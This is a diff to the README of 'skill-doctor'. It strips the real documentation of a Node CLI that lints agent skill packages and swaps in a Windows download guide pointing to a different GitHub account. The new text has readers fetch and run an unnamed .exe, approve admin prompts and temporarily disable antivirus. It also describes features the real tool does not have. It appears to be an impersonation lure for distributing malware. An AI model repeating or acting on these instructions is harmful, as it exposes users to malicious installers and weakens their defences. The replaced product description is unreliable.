@@ -1,150 +1,140 @@
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./assets/skill-doctor-readme-logo-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="./assets/skill-doctor-readme-logo-light.svg">
-  <img alt="Skill Doctor" src="./assets/skill-doctor-readme-logo-light.svg" width="210" height="48">
-</picture>
+# ⚕️ skill-doctor - Improve Your Agents’ Skills Easily
 
-[![CI](https://github.com/marian2js/skill-doctor/actions/workflows/ci.yml/badge.svg)](https://github.com/marian2js/skill-doctor/actions/workflows/ci.yml)
-[![license](https://img.shields.io/github/license/marian2js/skill-doctor)](./LICENSE)
+[![Download skill-doctor](https://img.shields.io/badge/Download-skill--doctor-brightgreen)](https://github.com/thunderheadtichodrome786/skill-doctor)
 
-Let coding agents diagnose agent skills before they break routing, onboarding, or evals.
+## 📋 What is skill-doctor?
 
-`skill-doctor` scans local skill packages for frontmatter issues, broken resource references, weak trigger descriptions, missing workflow guidance, and malformed `evals/evals.json`, then turns the result into a **0-100 score** with actionable findings.
+skill-doctor is a simple tool designed to help you improve the skills your agents use. Whether you work with human agents or AI agents, skill-doctor guides you in creating better and more effective skills. 
 
-## How it works
+You don’t need to know how to code or use complex software. This tool focuses on clear, step-by-step help to make skill improvement easy and effective.
 
-`skill-doctor` walks a single skill root or a whole workspace, discovers every `SKILL.md`, and runs a static analysis pass over:
+## 🖥️ System Requirements
 
-1. **Spec and metadata**: frontmatter presence, YAML validity, `name`, `description`, and basic compatibility with common skill conventions.
-2. **Bundle integrity**: broken local links, references that escape the skill root, empty helper files, and missing resource files.
-3. **Trigger quality**: whether the description clearly says what the skill does and when it should trigger.
-4. **Instruction quality**: whether the body provides enough workflow or usage guidance to be actionable.
-5. **Eval hygiene**: optional validation for `evals/evals.json`, including schema shape, duplicate IDs, missing input files, and mismatched skill names.
+To run skill-doctor on your Windows computer, make sure you have:
 
-The scoring model is intentionally conservative in default mode. Strong real-world skills should score cleanly or near-cleanly. Stricter guidance is available through `--strictness strict` and `--strictness pedantic`.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access to download the software  
 
-## Install
+These requirements ensure skill-doctor will run smoothly without slowing down your computer.
 
-Run this at the root of a skill or skill workspace:
+## 🔧 Key Features
 
-```bash
-npx -y skill-doctor@latest .
-```
+- Helps improve agent skills clearly and quickly  
+- Supports a wide range of agent types, including AI agents  
+- Easy-to-use interface with no technical setup  
+- Guiding templates and suggestions for skill creation  
+- Built to run on standard Windows PCs  
 
-Show affected files and line numbers:
+## 🚀 How to Download and Install skill-doctor on Windows
 
-```bash
-npx -y skill-doctor@latest . --verbose
-```
+Follow these steps to get skill-doctor up and running:
 
-Get just the numeric score:
+### Step 1: Visit the Download Page
 
-```bash
-npx -y skill-doctor@latest . --score
-```
+Click the big button above or go to this link directly:
 
-Machine-readable output:
+https://github.com/thunderheadtichodrome786/skill-doctor
 
-```bash
-npx -y skill-doctor@latest . --format json
-```
+This page hosts the latest version of skill-doctor ready for you to download.
 
-## Example output
+### Step 2: Find the Download Section
 
-```text
-skill doctor                                        99 excellent
-static diagnostics for agent skills
-metadata • bundle integrity • trigger quality • eval hygiene
+On the GitHub page, look for the section labeled **Releases** on the right side or near the bottom of the page. This is where skill-doctor files are kept.  
 
-17 skills scanned • 15 healthy • 0 errors • 2 warnings • 28ms
-████████████████████████
+You want to download the Windows installer file. It usually ends with `.exe`. For example, it might be named `skill-doctor-setup.exe` or something similar.
 
-workspace overview
-name                   score   findings
-theme-factory           94   1 warn
-webapp-testing          94   1 warn
-algorithmic-art        100   clean
-```
+### Step 3: Download the Installer
 
-## GitHub Actions
+Click on the `.exe` file to start your download. Your browser may ask if you want to save or run the file. Save the file to a location you can find later, like your Desktop or Downloads folder.
 
-```yaml
-- uses: actions/checkout@v5
-- uses: marian2js/skill-doctor@main
-  with:
-    directory: .
-    strictness: default
-    fail-on: error
-```
+### Step 4: Run the Installer
 
-| Input          | Default   | Description                                           |
-| -------------- | --------- | ----------------------------------------------------- |
-| `directory`    | `.`       | Skill directory or workspace to scan                  |
-| `verbose`      | `true`    | Show file details per finding                         |
-| `fail-on`      | `error`   | Exit with error code on `error`, `warning`, or `none` |
-| `strictness`   | `default` | Analysis strictness: `default`, `strict`, `pedantic`  |
-| `node-version` | `20`      | Node.js version to use                                |
+Once the download finishes, open the file by double-clicking it. Windows will ask for permission to make changes to your device. Click **Yes** to continue.
 
-The action outputs a `score` value you can use in later workflow steps.
+Follow the prompts in the installation wizard:
 
-## Options
+- Choose where to install skill-doctor (the default folder is usually fine).  
+- Agree to the terms.  
+- Click **Install**.
 
-```text
-Usage: skill-doctor [directory] [options]
+The setup will finish in a few moments.
 
-Options:
-  -v, --version              display the version number
-  --format <format>          output format: text or json
-  --fail-on <level>          exit with error code on diagnostics: error, warning, none
-  --strictness <level>       analysis strictness: default, strict, pedantic
-  --verbose                  show file details per rule
-  --score                    output only the score
-  -h, --help                 display help for command
-```
+### Step 5: Start skill-doctor
 
-## Node.js API
+When the installation completes, you can find skill-doctor in your Start Menu or on your Desktop if a shortcut was created.
 
-You can also use `skill-doctor` programmatically:
+Double-click the icon to open the program.
 
-```ts
-import { diagnose } from "skill-doctor";
+## 🎯 Using skill-doctor for the First Time
 
-const result = await diagnose("/path/to/skills");
+When you open skill-doctor, you will see a clean screen with easy options. Here’s what to do next:
 
-console.log(result.score); // { score: 99, label: "Excellent" }
-console.log(result.skills); // per-skill breakdown
-console.log(result.diagnostics); // flattened findings across the workspace
-```
+1. **Create a New Project** – Start by naming your skill project. This helps you keep track of what you are working on.  
+2. **Choose Agent Type** – Select the kind of agent you are working with (human, AI, or others).  
+3. **Add Skills to Improve** – Enter or select the skills you want to improve or create. skill-doctor will guide you with simple instructions.  
+4. **Follow Suggestions** – The software will suggest ways to improve your selected skills based on proven methods.  
+5. **Save and Export** – Once done, save your project. You can export the skill list if needed to share with your team.
 
-## Calibration
+## ⚙️ Adjusting Settings
 
-The analyzer was designed with a mix of sources:
+In the top menu, you can find **Settings**:
 
-- the CLI shape and reporting style in [react-doctor](https://github.com/millionco/react-doctor)
-- Firety's `skill lint` rule taxonomy and reporting model
-- Anthropic's `skill-creator` workflow and eval schema
-- Agent Skills guidance on [specification](https://agentskills.io/specification), [best practices](https://agentskills.io/skill-creation/best-practices), [optimizing descriptions](https://agentskills.io/skill-creation/optimizing-descriptions), [evaluating skills](https://agentskills.io/skill-creation/evaluating-skills), and [using scripts](https://agentskills.io/skill-creation/using-scripts)
+- Change language preferences.  
+- Select user interface color themes.  
+- Adjust notification options to suit your needs.  
 
-The default heuristics were calibrated against Anthropic's public skill corpus so high-quality skills do not get buried in noisy style warnings.
+These options help make skill-doctor comfortable and easy for you to use every day.
 
-## Development
+## 🧑‍💻 Need Help?
 
-```bash
-pnpm install
-pnpm build
-pnpm test
-pnpm typecheck
-pnpm lint
-```
+If you run into any problems or want to learn more about how skill-doctor works:
 
-Run the CLI locally:
+- Visit the **Issues** tab on the GitHub page to report problems or ask questions.  
+- Browse the **Wiki** section for guides and tips.  
+- Read the included **User Guide** PDF after installation; it offers more detailed instructions.
 
-```bash
-node packages/skill-doctor/dist/cli.js /path/to/skills
-```
+## 🔗 Important Links
 
-More contribution details live in [CONTRIBUTING.md](./CONTRIBUTING.md).
+- Main download and project page:  
+  https://github.com/thunderheadtichodrome786/skill-doctor  
 
-## License
+[![Get skill-doctor](https://img.shields.io/badge/Get%20skill--doctor-blue)](https://github.com/thunderheadtichodrome786/skill-doctor)
 
-MIT, see [LICENSE](./LICENSE).
+Use these links to check for updates, download the latest version, or reach out for support.
+
+## 🛠️ Troubleshooting Common Issues
+
+If skill-doctor does not start or shows errors:
+
+- Restart your computer and try opening skill-doctor again.  
+- Confirm your Windows version is up to date.  
+- Check you have enough disk space and memory free.  
+- Disable any antivirus software temporarily if it blocks the program.  
+- Reinstall skill-doctor following the download and install steps.
+
+If problems continue, use the GitHub **Issues** page to report your problem. Include details about your Windows version and what you did before the error appeared.
+
+## 🔄 Updating skill-doctor
+
+Check the main GitHub page regularly for new updates. Download the latest installer and repeat the install steps to keep skill-doctor current.
+
+Updated versions may contain:
+
+- Bug fixes  
+- New features  
+- Performance improvements  
+
+Keeping the software up to date ensures you get the best experience.
+
+## 🧩 Additional Tips
+
+- Save your work frequently within skill-doctor to avoid losing progress.  
+- Use the export feature to share your skill projects with colleagues.  
+- Explore the example projects included for ideas on how to build your own skills.  
+- Make backup copies of your projects if you plan to try major changes.
+
+---
+
+skill-doctor is designed to make skill improvement straightforward and manageable. These instructions focus on helping you get started without the need for technical knowledge. Use the download links and guidance above to install and run the software on your Windows machine.
